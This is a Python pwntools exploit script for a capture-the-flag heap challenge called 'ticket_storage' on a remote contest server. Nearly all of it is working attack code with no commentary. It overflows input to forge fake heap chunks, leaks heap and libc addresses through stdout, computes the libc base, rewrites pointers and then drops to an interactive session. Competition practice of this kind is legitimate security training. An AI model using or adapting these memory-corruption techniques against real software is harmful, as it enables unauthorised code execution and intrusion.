from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
# r = process('./ticket_storage')
r = remote('tasks.aeroctf.com', 33014)
libc = ELF('./libc.so.6')

go = lambda x: r.sendlineafter('> ', str(x))
ii = lambda x: r.sendlineafter(': ', str(x))

resv_code = []

def reserve(s1, s2, s):
    go(1)
    ii(s1)
    ii(s2)
    ii(s)
    resv_code.append(r.recvuntil('\n').split(': ')[1].strip())

def view(s):
    go(2)
    ii(s)

def view_list():
    go(3)

def delete(s):
    go(4)
    ii(s)

def change(s):
    go(5)
    ii(s)

ii('A'*(0x88))
reserve('a'*(0x80-1), 'b'*(0x80-1), 0x31337)
reserve('a'*(0x80-1), 'b'*(0x80-1), 0x31337)
reserve('a'*(0x80-1), 'b'*(0x80-1), 0x31337)
reserve('a'*(0x80-1), 'b'*(0x80-1), 0x31337)
reserve('a'*(0x80-1), 'b'*(0x80-1), 0x31337)
reserve('a'*(0x80-1), 'b'*(0x80-1), 0x31337)
reserve('a'*(0x80-1), 'b'*(0x80-1), 0x31337)
reserve('a'*(0x80-1), 'b'*(0x80-1), 0x31337)

fake_chunk = p64(0x4041A8)
fake_chunk += p64(0x4040C0)
fake_chunk += p64(0x404120)
fake_chunk += p64(0x404120)
fake_chunk += p64(0x6161616161616161)
fake_chunk += p64(0x6161616161616161)
fake_chunk += (0x80-len(fake_chunk))*'a'

change(fake_chunk + p64(0x404120)[:-1])
view('a'*9)

r.recvuntil('From: ')
heap = u64(r.recvuntil('\n')[:-1].ljust(8, '\x00'))
log.info('heap leak : 0x%x' % heap)
r.recvuntil('To: ')
stdout = u64(r.recvuntil('\n')[:-1].ljust(8, '\x00'))
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
log.info('stdout leak : 0x%x' % stdout)
log.info('libc base : 0x%x' % libc_base)

fake_chunk = p64(0x4041A8)
fake_chunk += p64(heap-3104+144)
fake_chunk += p64(0x404120)
fake_chunk += p64(0x404120)
fake_chunk += p64(0x6161616161616161)
fake_chunk += p64(0x6161616161616161)
fake_chunk += (0x80-len(fake_chunk))*'a'
change(fake_chunk + p64(0x404120)[:-1])

view('a'*9)

# gdb.attach(r)
r.interactive()